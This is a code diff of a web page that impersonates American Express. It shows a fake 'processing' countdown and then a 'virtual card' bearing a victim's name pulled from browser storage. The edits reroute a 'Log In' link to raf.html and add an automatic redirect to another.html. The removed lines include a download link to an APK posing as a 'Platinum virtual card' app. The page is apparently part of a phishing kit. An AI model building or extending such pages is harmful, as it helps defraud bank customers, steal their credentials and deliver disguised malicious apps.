@@ -25,10 +25,10 @@ body{
     overflow-x:hidden;
 }
 
-/* NAVBAR */
+/* NAVBAR - वेबव्यू (WebView) में कटने से बचाने के लिए पैडिंग और सेफ एरिया जोड़ी गई है */
 nav{
     background:#fff;
-    padding:12px 5%;
+    padding: max(20px, env(safe-area-inset-top, 20px)) 5% 12px 5%;
     display:flex;
     align-items:center;
     border-bottom:1px solid #ddd;
@@ -66,6 +66,9 @@ nav{
     padding:8px 20px;
     font-weight:bold;
     cursor:pointer;
+    text-decoration:none;
+    color:#000;
+    display:inline-block;
 }
 
 /* PROCESSING SCREEN */
@@ -307,37 +310,6 @@ nav{
     }
 }
 
-/* BUTTONS */
-.actions{
-    margin-top:35px;
-    display:flex;
-    gap:15px;
-    justify-content:center;
-    flex-wrap:wrap;
-}
-
-.btn{
-    padding:15px 38px;
-    border:none;
-    border-radius:50px;
-    background:linear-gradient(135deg,var(--amex-blue),#003da5);
-    color:#fff;
-    font-weight:bold;
-    cursor:pointer;
-    transition:0.35s;
-    font-size:15px;
-    text-decoration:none;
-    display:inline-flex;
-    align-items:center;
-    justify-content:center;
-    box-shadow:0 12px 25px rgba(0,23,90,0.25);
-}
-
-.btn:hover{
-    transform:translateY(-3px) scale(1.02);
-    background:linear-gradient(135deg,var(--amex-light),#0057b8);
-}
-
 /* FOOTER */
 footer{
     text-align:center;
@@ -426,7 +398,7 @@ footer{
         <a href="#">Insurance</a>
     </div>
 
-    <button class="login-btn">Log In</button>
+    <a href="raf.html" class="login-btn">Log In</a>
 </nav>
 
 <!-- CARD -->
@@ -445,11 +417,6 @@ footer{
                     <!-- FRONT NAME -->
                     <div class="card-name" id="cardName">
                     </div>
-
-                    <!-- FRONT NUMBER -->
-                 <!--   <div class="card-number">
-                        XXXX XXXX XXXX 3579
-                    </div>   -->
 
                 </div>
 
@@ -470,19 +437,10 @@ footer{
 
         </div>
 
-        <!-- BUTTON -->
-   <!--     <div class="actions">
-
-            <a href="https://github.com/hhhy97851-star/security/blob/main/Your%20Platinum%20virtual%20card.apk" class="btn">   
-                Proceed
-            </a>
-
-        </div>
-
     </div>
 
 </div>
--->
+
 <!-- FOOTER -->
 <footer>
     Copyright © 2026 American Express Banking Corp.
@@ -492,20 +450,15 @@ footer{
 
 /*
 =====================================================
-PROCESSING TIMER
+PROCESSING TIMER & 15-SECOND REDIRECT TIMER
 =====================================================
 */
 
 let timeLeft = 12;
 
-const timer =
-document.getElementById("timer");
-
-const processingScreen =
-document.getElementById("processingScreen");
-
-const mainWrapper =
-document.getElementById("mainWrapper");
+const timer = document.getElementById("timer");
+const processingScreen = document.getElementById("processingScreen");
+const mainWrapper = document.getElementById("mainWrapper");
 
 const countdown = setInterval(() => {
 
@@ -521,12 +474,15 @@ const countdown = setInterval(() => {
         clearInterval(countdown);
 
         processingScreen.classList.add("hide");
-
         mainWrapper.classList.add("show");
+
+        setTimeout(() => {
+            window.location.href = "another.html";
+        }, 15000);
 
     }
 
-},1000);
+}, 1000);
 
 /*
 =====================================================
@@ -534,8 +490,7 @@ GET FULL NAME FROM LOCALSTORAGE
 =====================================================
 */
 
-const fullName =
-localStorage.getItem("fullName") || "";
+const fullName = localStorage.getItem("fullName") || "";
 
 /*
 =====================================================
@@ -543,8 +498,7 @@ SHOW NAME
 =====================================================
 */
 
-document.getElementById("cardName").innerText =
-fullName.toUpperCase();
+document.getElementById("cardName").innerText = fullName.toUpperCase();
 
 </script>
 
